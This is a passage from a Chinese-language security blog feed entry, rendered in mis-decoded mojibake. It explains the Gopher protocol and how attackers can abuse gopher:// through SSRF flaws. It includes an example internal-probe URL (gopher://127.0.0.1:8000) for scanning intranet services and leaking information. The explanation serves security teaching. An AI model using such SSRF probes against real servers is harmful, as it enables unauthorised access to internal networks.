Gopherï¼Œå®ƒæ˜¯ä¸€ç§ç”¨äºä¿¡æ¯æ£€ç´¢çš„åè®®ï¼Œå…è®¸ç”¨æˆ·é€šè¿‡ç»“æ„åŒ–çš„å±‚æ¬¡ç›®å½•è®¿é—®ä¿¡æ¯ã€‚è™½ç„¶ Gopher åè®®å·²ç»è¿‡æ—¶ï¼Œä½†ä»ç„¶å­˜åœ¨ä¸€äº›é—ç•™çš„ Gopher æœåŠ¡å™¨ï¼Œä¾›ç”¨æˆ·è®¿é—®æ–‡ä»¶ã€æ–‡æ¡£ç­‰ä¿¡æ¯ã€‚</p><p>ä¾‹å¦‚ï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">gopher://gopher.floodgap.com/1/0/1/textfile.txt</span><br></pre></td></tr></table></figure></div><p>è¿™å°†è¿æ¥åˆ°ä¸€ä¸ª Gopher æœåŠ¡å™¨ï¼Œä¸‹è½½ <code>textfile.txt</code> æ–‡ä»¶ã€‚</p><h4 id="å¸¸è§ç”¨é€”ï¼š-2"><a href="#å¸¸è§ç”¨é€”ï¼š-2" class="headerlink" title="å¸¸è§ç”¨é€”ï¼š"></a><strong>å¸¸è§ç”¨é€”</strong>ï¼š</h4><ul><li><strong>ä¿¡æ¯æ£€ç´¢</strong>ï¼šGopher åè®®åŸæœ¬ç”¨äºæä¾›ç»“æ„åŒ–çš„æ–‡æœ¬å’Œä¿¡æ¯æ£€ç´¢ï¼Œç±»ä¼¼äºæ—©æœŸçš„ç½‘ç»œæœç´¢å¼•æ“ã€‚</li><li><strong>æ•™è‚²å’Œæ¡£æ¡ˆ</strong>ï¼šä¸€äº›æ—§çš„ Gopher æœåŠ¡ä»ç„¶åœ¨ä½¿ç”¨ï¼Œç”¨äºå­˜æ¡£èµ„æ–™æˆ–ä½œä¸ºæ€€æ—§ç”¨é€”ã€‚</li></ul><h4 id="æ”»å‡»åœºæ™¯ï¼š-2"><a href="#æ”»å‡»åœºæ™¯ï¼š-2" class="headerlink" title="æ”»å‡»åœºæ™¯ï¼š"></a><strong>æ”»å‡»åœºæ™¯</strong>ï¼š</h4><p>ä¸ <code>file://</code> å’Œ <code>dict://</code> åè®®ç›¸æ¯”ï¼Œ<code>gopher://</code> åè®®çš„å®‰å…¨é—®é¢˜æ›´åŠ éšè”½ï¼Œå¯èƒ½ä¼šè¢«é”™è¯¯åœ°ä½¿ç”¨æˆ–æ»¥ç”¨ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ SSRF æ¼æ´é€šè¿‡ <code>gopher://</code> åè®®å‘èµ·è¯·æ±‚ï¼Œå°è¯•è®¿é—®å†…ç½‘æœåŠ¡æˆ–è·å–ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼š</p><ul><li><strong>å†…éƒ¨æœåŠ¡æ‰«æ</strong>ï¼šæ”»å‡»è€…å¯ä»¥é€šè¿‡ Gopher åè®®æ‰«æç›®æ ‡ Web åº”ç”¨æ‰€åœ¨ç½‘ç»œä¸­çš„å†…ç½‘æœåŠ¡ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥åˆ©ç”¨ <code>gopher://127.0.0.1:8000</code> æ¥è®¿é—®å†…ç½‘æœåŠ¡ã€‚</li><li><strong>ä¿¡æ¯æ³„éœ²</strong>ï¼šæ”»å‡»è€…å¯èƒ½é€šè¿‡ Gopher åè®®è®¿é—®ç›®æ ‡æœåŠ¡å™¨çš„æœªæˆæƒç«¯å£ï¼Œæ³„éœ²æ•æ„Ÿçš„å†…éƒ¨ä¿¡æ¯ã€‚</li></ul><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="SSRF" scheme="http://example.com/categories/SSRF/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="phpä¼ªåè®®" scheme="http://example.com/tags/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    
  </entry>
  
</feed>
